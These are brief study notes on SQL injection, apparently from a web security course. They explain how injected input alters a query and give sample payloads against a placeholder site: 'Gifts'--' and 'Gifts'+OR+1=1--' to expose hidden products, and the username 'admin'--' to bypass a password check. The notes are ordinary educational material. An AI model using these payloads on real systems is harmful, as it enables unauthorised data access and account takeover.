# SQL injection

* SQLi - web security vulnerability; allows attacker to interfere with queries made by app to database.

* SQLi allows attacker to view data they are not supposed to retrieve; they can modify/delete this data, or escalate it to compromise the server or perform a denial-of-service attack.

* SQLi examples:

  * Retrieving hidden data:

    * Suppose the URL for a website is ```https://insecure-website.com/products?category=Gifts```. For this, the SQL query would be like:

    ```sql
    SELECT * FROM products WHERE category = 'Gifts' AND released = 1
    ```

    * The attacker can construct an attack like ```https://insecure-website.com/products?category=Gifts'--```. This gives us the query:

    ```sql
    SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1

    -- acts as a comment in the query
    ```

    * The attacker can also use ```https://insecure-website.com/products?category=Gifts'+OR+1=1--```, which gives us the query:

    ```sql
    SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
    ```

  * Subverting app logic:

    * For app login, suppose the following SQL query is used:

    ```sql
    SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
    ```

    * The attacker can login without password by using the username ```admin'--``` in order to cut short the query:

    ```sql
    SELECT * FROM users WHERE username = 'admin'--' AND password = ''
    ```
